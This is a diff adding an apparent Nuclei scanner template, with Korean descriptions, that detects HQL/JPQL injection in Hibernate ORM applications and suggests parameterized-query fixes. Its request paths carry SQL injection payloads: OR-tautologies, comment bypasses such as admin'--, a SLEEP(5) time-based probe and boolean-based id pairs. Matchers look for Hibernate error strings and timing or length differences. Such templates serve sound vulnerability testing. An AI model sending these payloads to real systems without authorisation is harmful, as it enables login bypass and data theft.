@@ -1,0 +1,55 @@
+id: sqli-orm-hql-injection
+
+info:
+  name: HQL/JPQL Injection (Hibernate ORM)
+  author: security-researcher
+  severity: high
+  description: |
+    Hibernate HQL(Hibernate Query Language) 및 JPQL 인젝션 취약점을 탐지합니다.
+    ORM을 사용해도 동적 쿼리 생성 시 인젝션이 발생할 수 있습니다.
+  tags: sqli,hql,jpql,hibernate,orm,injection
+  remediation: |
+    - HQL/JPQL에서도 Parameterized Query 사용
+    - Query.setParameter() 메서드 활용
+    - Criteria API 또는 QueryDSL 사용 권장
+
+http:
+  - method: GET
+    path:
+      # HQL 인젝션 (Java 객체 기반)
+      - "{{BaseURL}}?name=test' OR '1'='1"
+      - "{{BaseURL}}?username=test' OR '1'='1"
+      - "{{BaseURL}}?email=test@test.com' OR '1'='1"
+      # HQL 주석 우회
+      - "{{BaseURL}}?name=test'--"
+      - "{{BaseURL}}?username=admin'--"
+      # From 절 인젝션
+      - "{{BaseURL}}?entity=User WHERE '1'='1' OR '1'='1"
+      # 시간 기반 (HQL은 DB 함수 호출 가능)
+      - "{{BaseURL}}?name=test' AND SLEEP(5) AND '1'='1"
+      - "{{BaseURL}}?id=1 and 1=1"
+      - "{{BaseURL}}?id=1 and 1=2"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "org\\.hibernate"
+          - "HibernateException"
+          - "QuerySyntaxException"
+          - "unexpected token"
+          - "org\\.springframework\\.dao"
+          - "javax\\.persistence"
+          - "could not execute query"
+          - "unexpected end of subtree"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "len(body_1) != len(body_2) && status_code_1 == 200 && status_code_2 == 200"
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
